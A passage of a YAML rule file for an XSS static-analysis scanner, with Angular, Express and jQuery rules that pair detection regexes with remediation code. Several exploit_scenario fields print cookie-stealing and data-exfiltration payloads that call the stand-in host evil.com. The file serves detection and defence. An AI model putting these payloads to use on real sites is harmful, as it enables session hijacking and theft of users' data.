  # --------------------------------------------------------------------------
  # XSS-JS-005: Angular bypassSecurityTrust Methods
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-005
    title: Angular bypassSecurityTrust with Unsanitized Input
    description: >
      Detects usage of Angular's DomSanitizer bypass methods including
      bypassSecurityTrustHtml, bypassSecurityTrustScript, bypassSecurityTrustUrl,
      bypassSecurityTrustResourceUrl, and bypassSecurityTrustStyle with user-controlled
      data. These methods explicitly disable Angular's built-in XSS protection
      and should only be used with verified safe content.
    language: javascript
    category: xss
    severity: High
    confidence: 0.93
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, angular, bypassSecurityTrust, domSanitizer, typescript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'bypassSecurityTrustHtml\s*\(\s*(?:.*(?:user|input|param|data|content|body|html|comment|post|response))'
        description: "bypassSecurityTrustHtml with user-controlled data"
      - type: regex
        pattern: 'bypassSecurityTrustScript\s*\(\s*(?:.*(?:user|input|param|data|code|script|eval))'
        description: "bypassSecurityTrustScript with user-controlled data"
      - type: regex
        pattern: 'bypassSecurityTrustUrl\s*\(\s*(?:.*(?:user|input|param|data|url|href|link|redirect))'
        description: "bypassSecurityTrustUrl with user-controlled URL"
      - type: regex
        pattern: 'bypassSecurityTrustResourceUrl\s*\(\s*(?:.*(?:user|input|param|data|url|src|iframe|embed))'
        description: "bypassSecurityTrustResourceUrl with user-controlled URL"
      - type: regex
        pattern: 'bypassSecurityTrustStyle\s*\(\s*(?:.*(?:user|input|param|data|style|css|color))'
        description: "bypassSecurityTrustStyle with user-controlled CSS"
      - type: regex
        pattern: '(?:pipe|transform)\s*\([^)]*\)\s*\{[^}]*bypassSecurityTrust\w+\s*\([^)]*\)'
        description: "Angular pipe using bypassSecurityTrust without sanitization"
      - type: regex
        pattern: '\[innerHTML\]\s*=\s*"(?:user|content|data|body|html|message|comment)\w*"'
        description: "Angular innerHTML binding with user-controlled property"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - 'sanitizer'
      - 'SafeHtml.*check'
      - 'validate'
      - '.spec.'
      - '.test.'
      - '__tests__'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'jasmine'
      - 'karma'
      - 'TestBed'
    bypass_variants:
      - description: "Custom pipe wrapping bypassSecurityTrust without sanitization"
        pattern: '@Pipe\s*\([^)]*\)[^}]*implements\s+PipeTransform[^}]*bypassSecurityTrust\w+\s*\([^)]*\)\s*;?\s*\}'
      - description: "DomSanitizer injected but used to bypass on all content"
        pattern: 'constructor\s*\(\s*private\s+sanitizer\s*:\s*DomSanitizer\s*\)[^}]*bypassSecurityTrust\w+\s*\(\s*(?:this\.)?(?:content|data|html)'
      - description: "Angular component binding with interpolation in [innerHTML]"
        pattern: '\[innerHTML\]\s*=\s*".*\+.*(?:user|input|param|data)"'
    evasion_indicators:
      - "Custom pipe hiding bypassSecurityTrust usage"
      - "DomSanitizer bypass applied globally in service"
      - "innerHTML binding with user-controlled interpolation"
      - "bypassSecurityTrustResourceUrl allowing iframe injection"
    encoding_variants:
      - type: "trust_html"
        pattern: 'bypassSecurityTrustHtml\s*\(\s*\w+'
      - type: "trust_url"
        pattern: 'bypassSecurityTrustUrl\s*\(\s*\w+'
      - type: "innerHTML_binding"
        pattern: '\[innerHTML\]\s*=\s*"[^"]*user[^"]*"'
    multi_function_chain_patterns:
      - "API response -> service method -> bypassSecurityTrustHtml -> [innerHTML] binding"
      - "route.params -> component property -> safeHtml pipe -> bypassSecurityTrustHtml"
      - "user.profile.bio -> bypassSecurityTrustHtml -> template display"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Angular security bypass enables XSS in protected framework"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "api_response"
        sink: "bypassSecurityTrustHtml"
        through: "service_method"
      - source: "route_params"
        sink: "bypassSecurityTrustUrl"
        through: "component_property"
      - source: "user_input"
        sink: "bypassSecurityTrustScript"
        through: "pipe_transform"
    impact: |
      Angular security bypass methods disable framework XSS protection:
      - Script injection via bypassSecurityTrustHtml
      - JavaScript URI injection via bypassSecurityTrustUrl
      - Resource loading from attacker-controlled URLs
      - CSS injection for data exfiltration
    remediation: |
      ```typescript
      // SECURE: Use Angular's built-in sanitization (default behavior)
      // Angular automatically sanitizes [innerHTML] bindings

      // If bypass is truly needed, sanitize first
      import DOMPurify from 'dompurify';

      @Pipe({ name: 'safeHtml' })
      export class SafeHtmlPipe implements PipeTransform {
        constructor(private sanitizer: DomSanitizer) {}
        transform(value: string): SafeHtml {
          const clean = DOMPurify.sanitize(value);
          return this.sanitizer.bypassSecurityTrustHtml(clean);
        }
      }
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://angular.io/guide/security#sanitization-and-security-contexts"
    context_awareness:
      surrounding_context_patterns: ['DomSanitizer', 'bypassSecurityTrust', 'Angular', '@Component', '@Pipe']
      taint_source_indicators: ['ActivatedRoute', 'HttpClient', '@Input', 'route.params']
      taint_sink_indicators: ['bypassSecurityTrustHtml', 'bypassSecurityTrustUrl', 'bypassSecurityTrustScript']
      sanitization_patterns: ['DOMPurify', 'Angular built-in sanitizer', 'sanitize']
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (1 + bypass_method_severity)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        Angular component with bypassSecurityTrustHtml on user profile:
        this.sanitizer.bypassSecurityTrustHtml(user.bio);
        Attacker sets bio: <img src=x onerror="fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://evil.com',{method:'POST',body:JSON.stringify(d)}))">
      example_payload: "<img src=x onerror=fetch('https://evil.com?cookie='+document.cookie)>"
      attacker_objective: "Exploit Angular bypassSecurityTrust for stored XSS"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-003, XSS-JS-004]

  # --------------------------------------------------------------------------
  # XSS-JS-006: Stored XSS via Database Content
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-006
    title: Stored XSS via Unsanitized Database Content Rendering
    description: >
      Detects server-side rendering patterns in Node.js/Express where database
      content is rendered into HTML templates without proper escaping or sanitization.
      Stored XSS is the most dangerous XSS variant because it persists across
      sessions and affects all users viewing the poisoned content.
    language: javascript
    category: xss
    severity: High
    confidence: 0.88
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, stored-xss, database, template, express, javascript]
    detection_layer: 2
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'res\.send\s*\(\s*[`''"]<.*?\$\{.*?(?:user|data|record|post|comment|message|content)[\.\[].*?\}.*?>'
        description: "res.send with template literal embedding DB data in HTML"
      - type: regex
        pattern: 'res\.send\s*\(\s*[''"]<.*?[''"].*?\+.*?(?:user|data|record|post|comment|message|content)[\.\[]'
        description: "res.send concatenating HTML with DB data"
      - type: regex
        pattern: '(?:ejs|pug|hbs|handlebars|mustache).*?(?:\{?\{\{?\{?\s*)(?:user|data|record|post|comment|message|content)\.\w+(?:\s*\}?\}\}?\}?)'
        description: "Template rendering unescaped variable from database"
      - type: regex
        pattern: '(?:triple-brace|triple_stache|raw|safe|html)\s*(?:\{?\{\{?\{?\s*)(?:user|content|comment|post|message)'
        description: "Template helper outputting raw/unescaped database content"
      - type: regex
        pattern: '\{\{\{.*?(?:content|body|html|bio|description|comment|message).*?\}\}\}'
        description: "Handlebars triple-mustache (unescaped) with content fields"
      - type: regex
        pattern: '(?:!{|!=|!==)\s*(?:user|content|html|body|comment|post)\.'
        description: "Pug/Jade unescaped output of database content"
    anti_patterns:
      - 'escape'
      - 'sanitize'
      - 'DOMPurify'
      - 'xss-filters'
      - 'encode'
      - 'he.encode'
      - 'entities'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'autoEscaping'
    bypass_variants:
      - description: "Template engine with auto-escaping disabled"
        pattern: 'app\.set\s*\(\s*[''"]view options[''"].*?escape\s*:\s*false'
      - description: "EJS with unescaped output tag"
        pattern: '<%[-=]\s*(?:user|content|data|post|comment)\.'
      - description: "Nunjucks safe filter on user content"
        pattern: '\|\s*safe\s*\}\}.*?(?:content|html|body|comment|message)'
    evasion_indicators:
      - "Template auto-escaping disabled globally"
      - "Unescaped template output tags"
      - "Safe/raw filter on user-generated content"
      - "Database HTML field rendered without sanitization"
    encoding_variants:
      - type: "template_literal"
        pattern: '`<html>.*?\$\{.*?data\.\w+.*?\}.*?</html>`'
      - type: "handlebars_raw"
        pattern: '\{\{\{.*?\}\}\}'
      - type: "ejs_unescaped"
        pattern: '<%[-]\s*\w+\.\w+\s*%>'
    multi_function_chain_patterns:
      - "db.find() -> result.content -> ejs render -> unescaped output"
      - "Model.findById() -> doc.html -> res.send('<div>' + doc.html)"
      - "mongodb.findOne() -> data.bio -> handlebars {{{bio}}}"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Stored XSS persists and affects all users viewing content"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "database_record"
        sink: "html_template"
        through: "unescaped_output"
      - source: "mongodb_document"
        sink: "res_send"
        through: "string_concatenation"
      - source: "user_generated_content"
        sink: "template_render"
        through: "raw_filter"
    impact: |
      Stored XSS from database content affects all viewers:
      - Self-propagating XSS worms
      - Mass credential harvesting
      - Persistent phishing overlays
      - Cryptocurrency mining across all visitors
    remediation: |
      ```javascript
      // SECURE: Use template engine auto-escaping (default in most)
      // EJS: Use <%= %> (escaped) instead of <%- %> (raw)
      // Handlebars: Use {{ }} (escaped) instead of {{{ }}} (raw)

      // For HTML content, sanitize before storage AND rendering
      const DOMPurify = require('isomorphic-dompurify');
      const clean = DOMPurify.sanitize(userInput);
      await db.collection('posts').insertOne({ content: clean });
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
    context_awareness:
      surrounding_context_patterns: ['render', 'template', 'ejs', 'handlebars', 'res.send']
      taint_source_indicators: ['findById', 'findOne', 'query', 'db.collection', 'Model.find']
      taint_sink_indicators: ['res.send', 'res.render', 'innerHTML', '{{{', '<%-']
      sanitization_patterns: ['DOMPurify', 'sanitize', 'escape', 'encode', 'he.encode']
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 + affected_user_count)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        Blog comment stored and rendered without sanitization:
        1. Attacker submits comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
        2. Comment stored in MongoDB without sanitization
        3. Every user viewing the blog post executes the script
      example_payload: "<script>new Image().src='https://evil.com/c='+document.cookie</script>"
      attacker_objective: "Persist malicious script that executes for all content viewers"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-001, XSS-JS-007]

  # --------------------------------------------------------------------------
  # XSS-JS-007: Reflected XSS via Express Response
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-007
    title: Reflected XSS via Express Request Parameters
    description: >
      Detects reflected XSS patterns in Express.js where request query parameters,
      URL parameters, headers, or body fields are directly reflected in the HTTP
      response without encoding. Reflected XSS requires victim interaction (clicking
      a crafted link) but is still widely exploitable via phishing and social engineering.
    language: javascript
    category: xss
    severity: High
    confidence: 0.90
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, reflected-xss, express, server-side, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: 'res\.send\s*\(\s*[`''"].*?(?:req\.query|req\.params|req\.body|req\.headers)\.\w+'
        description: "res.send reflecting request data in response"
      - type: regex
        pattern: 'res\.send\s*\(\s*[''"]<.*?[''"].*?\+.*?req\.(?:query|params|body)\.\w+'
        description: "res.send concatenating HTML with request parameters"
      - type: regex
        pattern: 'res\.(?:write|end)\s*\(\s*[`''"]<.*?(?:req\.query|req\.params|req\.body)'
        description: "res.write/end reflecting request data"
      - type: regex
        pattern: 'res\.send\s*\(\s*`[^`]*\$\{req\.(?:query|params|body)\.\w+\}[^`]*`\s*\)'
        description: "res.send with template literal including request data"
      - type: regex
        pattern: 'res\.json\s*\(\s*\{[^}]*(?:html|message|error)\s*:\s*[`''"]<.*?req\.(?:query|params|body)'
        description: "JSON response with HTML containing reflected request data"
      - type: regex
        pattern: 'res\.status\s*\(\s*\d+\s*\)\.send\s*\(\s*[`''"].*?req\.(?:query|params|body)\.\w+'
        description: "Error response reflecting request parameters"
    anti_patterns:
      - 'escape'
      - 'sanitize'
      - 'encode'
      - 'he.encode'
      - 'xss-filters'
      - 'helmet'
      - 'Content-Type.*json'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'validator'
    bypass_variants:
      - description: "Error handler reflecting user input"
        pattern: 'app\.use\s*\(\s*\(\s*err.*?\)\s*=>\s*\{[^}]*res\.send.*?(?:req\.url|req\.path|req\.originalUrl)'
      - description: "404 handler reflecting requested URL"
        pattern: 'app\.use\s*\(\s*\(\s*req.*?\)\s*=>\s*\{[^}]*(?:404|not\s*found)[^}]*res\.send.*?req\.(?:url|path|originalUrl)'
      - description: "JSONP callback reflecting parameter"
        pattern: 'req\.query\.callback\s*\+\s*[''"]\\s*\(\s*[''"]'
    evasion_indicators:
      - "Error pages reflecting user input"
      - "404 handlers including requested URL"
      - "JSONP endpoints with unvalidated callbacks"
      - "Search pages reflecting query terms"
    encoding_variants:
      - type: "query_reflection"
        pattern: 'res\.send.*req\.query\.\w+'
      - type: "url_reflection"
        pattern: 'res\.send.*req\.(?:url|path|originalUrl)'
      - type: "header_reflection"
        pattern: 'res\.send.*req\.headers\.\w+'
    multi_function_chain_patterns:
      - "req.query.search -> res.send('<p>Results for: ' + search)"
      - "req.params.name -> template literal -> res.send(`Hello ${name}`)"
      - "req.url -> 404 handler -> res.send('Not found: ' + req.url)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Reflected XSS enables targeted attacks via crafted URLs"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.query"
        sink: "res.send"
        through: "string_concatenation"
      - source: "req.params"
        sink: "res.send"
        through: "template_literal"
      - source: "req.url"
        sink: "error_handler"
        through: "404_response"
    impact: |
      Reflected XSS in Express responses enables:
      - Targeted phishing via crafted URLs
      - Session hijacking of specific users
      - One-click account compromise
      - Credential theft via fake login forms
    remediation: |
      ```javascript
      const he = require('he');

      // SECURE: Encode user input before reflecting
      app.get('/search', (req, res) => {
        const query = he.encode(req.query.q);
        res.send(`<p>Results for: ${query}</p>`);
      });

      // BETTER: Use template engine with auto-escaping
      app.get('/search', (req, res) => {
        res.render('search', { query: req.query.q }); // Auto-escaped
      });
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
    context_awareness:
      surrounding_context_patterns: ['express', 'app.get', 'app.post', 'router', 'res.send']
      taint_source_indicators: ['req.query', 'req.params', 'req.body', 'req.headers']
      taint_sink_indicators: ['res.send', 'res.write', 'res.end', 'res.render']
      sanitization_patterns: ['he.encode', 'escape', 'sanitize', 'xss-filters', 'helmet']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 + reflection_context)"
      exploitability_score: High
    exploit_scenario:
      attack_example: |
        Express search endpoint reflecting query:
        res.send('<p>You searched for: ' + req.query.q + '</p>');
        URL: https://target.com/search?q=<script>document.location='https://evil.com/c='+document.cookie</script>
      example_payload: "https://target.com/search?q=<script>alert(document.cookie)</script>"
      attacker_objective: "Inject script via reflected request parameters"
    confidence_factors:
      pattern_strength: high
      context_match: high
      proximity_to_user_input: high
      sanitization_absence: high
    metadata:
      rule_version: '3.0.0'
      last_reviewed: '2025-01-15'
      rule_maturity_level: hardened
      detection_complexity: contextual
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [XSS-JS-006, XSS-JS-001]

  # --------------------------------------------------------------------------
  # XSS-JS-008: jQuery HTML Injection
  # --------------------------------------------------------------------------
  - rule_id: XSS-JS-008
    title: jQuery HTML Injection via .html() and Selector Manipulation
    description: >
      Detects jQuery XSS sinks including .html() with user input, .append() with
      unsanitized HTML strings, $(userInput) selector injection, and .attr() on
      event handler or href attributes with user data. jQuery's HTML manipulation
      methods parse and execute embedded scripts, making them common XSS vectors.
    language: javascript
    category: xss
    severity: High
    confidence: 0.90
    cwe: CWE-79
    owasp: A03:2021-Injection
    tags: [xss, jquery, html-injection, selector-injection, javascript]
    detection_layer: 1
    attack_surface_type: web
    patterns:
      - type: regex
        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.html\s*\(\s*(?:.*(?:param|input|query|user|data|content|response|body|value))[\.\[]'
        description: "jQuery .html() with user-controlled data"
      - type: regex
        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.html\s*\(\s*[`''"]<.*?\$\{.*?\}.*?>'
        description: "jQuery .html() with template literal containing interpolation"
      - type: regex
        pattern: '\$\s*\(\s*(?:.*(?:location|document\.URL|window\.name|param|input|query|user|data))'
        description: "jQuery selector with user-controlled input (selector injection)"
      - type: regex
        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.(?:append|prepend|after|before)\s*\(\s*[`''"]<.*?(?:param|input|query|user|data)'
        description: "jQuery DOM insertion with user-controlled HTML"
      - type: regex
        pattern: '\$\s*\(\s*[''"]#?\w+[''"].*?\)\.attr\s*\(\s*[''"](?:href|src|action|onload|onclick|onerror)[''"].*?(?:param|input|query|user|data)'
        description: "jQuery .attr() setting dangerous attribute with user input"
      - type: regex
        pattern: '\$\.(?:parseHTML|globalEval)\s*\(\s*(?:.*(?:param|input|query|user|data|response|content))'
        description: "jQuery parseHTML or globalEval with user-controlled content"
    anti_patterns:
      - 'DOMPurify'
      - 'sanitize'
      - '.text('
      - 'escape'
      - 'encodeHTML'
      - 'xss-filters'
      - '.test.'
      - '__tests__'
      - 'spec.'
      - 'mock'
      - 'fixture'
      - 'jest'
      - 'validator'
      - 'he.encode'
    bypass_variants:
      - description: "jQuery .html() via variable containing user data"
        pattern: '(?:var|let|const)\s+\w+\s*=\s*[''"]<.*?[''"].*?(?:param|input|user|data)[^;]*;[\\s\\S]*?\$\s*\([^)]+\)\.html\s*\(\s*\w+\s*\)'
      - description: "jQuery AJAX success callback injecting response HTML"
        pattern: '\$\.(?:ajax|get|post)\s*\([^)]*\)[^}]*\.(?:done|success|then)\s*\([^)]*\{[^}]*\.html\s*\('
      - description: "jQuery constructor with user input creating elements"
        pattern: '\$\s*\(\s*[''"]<\w+[''"].*?\+.*?(?:param|input|user|data)'
    evasion_indicators:
      - "jQuery .html() called on AJAX response data"
      - "jQuery selector injection via user input"
      - "jQuery DOM insertion methods creating HTML from user data"
      - "jQuery constructor building elements from user input"
    encoding_variants:
      - type: "html_method"
        pattern: '\.html\s*\(\s*(?:data|content|user|response)\.'
      - type: "selector_injection"
        pattern: '\$\s*\(\s*(?:user|param|input|data)\.'
      - type: "append_html"
        pattern: '\.append\s*\(\s*[''"]<.*?(?:user|data|param)'
    multi_function_chain_patterns:
      - "$.get('/api/data') -> .done(data => el.html(data.content))"
      - "location.hash -> $(hash) -> selector injection"
      - "$('#output').html('<p>' + userInput + '</p>')"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "jQuery XSS enables script injection in legacy web applications"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "user_input"
        sink: "jquery_html"
        through: "string_concatenation"
      - source: "location_hash"
        sink: "jquery_selector"
        through: "direct_pass"
      - source: "ajax_response"
        sink: "jquery_append"
        through: "callback_function"
    impact: |
      jQuery HTML injection enables XSS via multiple vectors:
      - .html() parses and executes script tags
      - Selector injection leads to DOM manipulation
      - .attr() on event handlers enables script execution
      - Legacy jQuery apps often lack CSP protection
    remediation: |
      ```javascript
      // SECURE: Use .text() instead of .html() for text content
      $('#output').text(userInput);

      // SECURE: Use DOMPurify when HTML rendering is needed
      import DOMPurify from 'dompurify';
      $('#output').html(DOMPurify.sanitize(htmlContent));

      // SECURE: Use safe jQuery selector patterns
      const el = document.getElementById(validId); // Instead of $(userInput)
      ```
    references:
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://api.jquery.com/html/"
    context_awareness:
      surrounding_context_patterns: ['jQuery', '$', '.html(', '.append(', '.attr(']
      taint_source_indicators: ['location.hash', 'location.search', 'URL', 'param']
      taint_sink_indicators: ['.html(', '.append(', '.prepend(', '.attr(', '.after(', '$(']
      sanitization_patterns: ['.text(', 'DOMPurify', 'sanitize', 'escape']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 + jquery_usage_prevalence)"
      exploitability_score: High
    exploit_scenario:
